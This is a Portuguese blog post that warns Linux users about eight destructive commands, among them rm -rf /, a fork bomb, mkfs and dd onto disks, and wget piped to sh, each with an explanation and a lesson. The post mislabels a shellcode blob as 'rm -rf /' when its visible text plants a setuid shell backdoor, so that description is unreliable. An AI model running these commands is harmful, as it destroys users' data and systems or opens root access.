---
layout: post
title:  Os 8 Comandos da Morte
date:   2016-02-03
categories: seguranca
---

![{{ post.title }}]({{ site.url }}/assets/img_posts/dark-hole.png)

Existem comandos no Linux que são realmente perigosos e podem destruir todo o sistema. Não é incomum ver trolls recomendarem que novatos no mundo Linux executem tais comandos simplesmente para tirarem sarro.

Aprender comandos que você não deve executar pode lhe ajudar a identificar possíveis ameaças e aumentar sua compreensão de como o Linux funciona.

Note que muitos desses comandos só são realmente perigosos se forem executados como Super Usuário (root).

## 1 – Excluir tudo

```sh
rm –rf /
```

O comando `rm -rf /` excluirá todo o sistema, incluindo todos os dispositivos que estejam montados.

### Interpretação:

- `rm`: Remove arquivos
- `rm -r`: Remove diretórios e arquivos recursivamente
- `rm -rf`: Remove diretórios e arquivos recursivamente de maneira forçada
- `/`: Local a ser removido


Algumas distribuições executarão esse comando sem lhe perguntar nada, então tenha atenção com isso!

O comando `rm` também pode ser usado de outras formas perigosas.

Por exemplo: `rm -rf ~` apaga tudo dentro da pasta home, e `rm -rf .*` apaga todos os arquivos ocultos, que podem possuir configurações importantes.

**Lição**: Muita atenção ao usar o `rm`.

## 2 – Excluir tudo (versão hexadecimal)

```sh
char esp[] __attribute__ ((section(“.text”))) /* e.s.p
release */
= “xebx3ex5bx31xc0x50x54x5ax83xecx64x68”
“xffxffxffxffx68xdfxd0xdfxd9x68x8dx99”
“xdfx81x68x8dx92xdfxd2x54x5exf7x16xf7”
“x56x04xf7x56x08xf7x56x0cx83xc4x74x56”
“x8dx73x08x56x53x54x59xb0x0bxcdx80x31”
“xc0x40xebxf9xe8xbdxffxffxffx2fx62x69”
“x6ex2fx73x68x00x2dx63x00”
“cp -p /bin/sh /tmp/.beyond; chmod 4755
/tmp/.beyond;”;
```

Lembre-se desse formato!

Esse código é a versão hexadecimal do `rm -rf /`. Executá-lo também irá destruir todo o sistema.

**Lição**: Nunca execute comandos de aparência estranha que você não saiba para o que serve.

## 3 – Fork Bomb

```sh
:(){ :|: & };:
```

A linha acima é uma função em bash de aparência simples, mas perigosa.

Esta linha curta define uma função que cria novas cópias de si mesmo. O processo replica-se continuamente, cada uma de suas cópias também replicam-se e rapidamente ocupa toda a capacidade de processamento da CPU e o espaço da memória. Isso fará com que o computador trave. Basicamente, é considerado um ataque de negação de serviços.

**Lição**: Funções bash são poderosas, mesmo que sejam muito curtas.

## 4 – Formatar HD

```sh
mkfs.ext4 /dev/sda1
```

O comando `mkfs.ext4 /dev/sda1` é simples de entender:

### Interpretação:

- `mkfs.ext4`: Define a criação de um novo sistema de arquivos ext4.
- `/dev/sda1`: Local onde será criado o novo sistema de arquivos.

Tomados em conjunto, este comando pode ser equivalente a formatação da partição C: no Windows - ele irá limpar os arquivos em sua primeira partição e substituí-los com um novo sistema de arquivos.

Este comando pode vir de outras formas, como `mkfs.ext3 /dev/sdb2` que formata a segunda partição no segundo disco rígido com o sistema de arquivos _ext3_.

**Lição**: Cuidado com a execução de comandos que irão para _/dev/sd*_.


## 5 – Escrever diretamente no HD

```sh
comando > /dev/sda
```

Essa linha de comando funciona de forma semelhante a anterior. Ela executa um comando e envia a saída desse comando para o primeiro disco rígido, escrevendo os dados diretamente na unidade de disco rígido e danifica o sistema de arquivos.

### Interpretação:

- `comando`: Pode ser qualquer comando.
- `>`: Envia a saída do comando para algum local.
- `/dev/sda`: Local para onde o comando é enviado.

**Lição**: Como no exemplo 4, cuidado com a execução de comandos que envolvem dispositivos de disco rígido com saída para _/dev/sd*_.

## 6 – Escrita aleatória no HD

```sh
dd if=/dev/random of=/dev/sda
```

O comando acima também destrói os dados de um disco rígido.

### Interpretação:

- `dd`: Executa a cópia de um local para outro.
- `if=/dev/random`: Usa dispositivos de entrada _/dev_ aleatórios.
- `of=/dev/sda`: Saída para o primeiro disco rígido, substituindo o seu sistema de arquivos com dados aleatórios.

**Lição**: O comando `dd` copia dados de um local para outro, o que pode ser perigoso se for copiando diretamente para um dispositivo.

## 7 – Baixar e executar scripts

```sh
wget http://site.com/arquivo -O - | sh
```

A linha acima faz download de um arquivo na web e o envia para o sh, que executa o conteúdo do script. Isso pode ser perigoso se não souber o que há no script ou se sua fonte não for confiável.

### Interpretação:

- `wget`: Realiza downloads.
- `http://site.com/arquivo`: Local a ser feito o download.
- `|`: Pipe (envia) a saída do comando wget (o conteúdo do arquivo baixado) para outro comando.
- `sh`: Comando que executará o arquivo.

**Lição** Não baixe e execute scripts não confiáveis.

## 8 – Mover diretórios para um buraco negro

```sh
mv ~ /dev/null
```

O _/dev/null_ é outro local especial que se deve ter atenção.

Qualquer coisa movida para _/dev/null_ é destruída. Pense nisso como um buraco negro.

### Interpretação:

- `mv`: Move arquivos ou diretórios.
- `~`: Representa pasta home do usuário logado.
- `/dev/null`: Local para onde a pasta home será movida.

**Lição**: O caractere ~ representa a pasta pessoal do usuário logado e move-la para _/dev/null_ irá destruí-la totalmente.